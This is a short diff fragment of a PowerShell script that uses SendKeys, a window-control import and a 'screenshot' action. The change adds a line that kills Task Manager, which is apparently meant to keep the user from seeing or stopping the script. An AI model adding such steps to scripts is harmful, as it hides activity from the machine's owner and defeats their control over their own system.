@@ -131,6 +131,7 @@ public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
         [System.Windows.Forms.SendKeys]::SendWait("~")
     }
 
+    Stop-Process taskmgr
 
     
     $actionss ="screenshot"
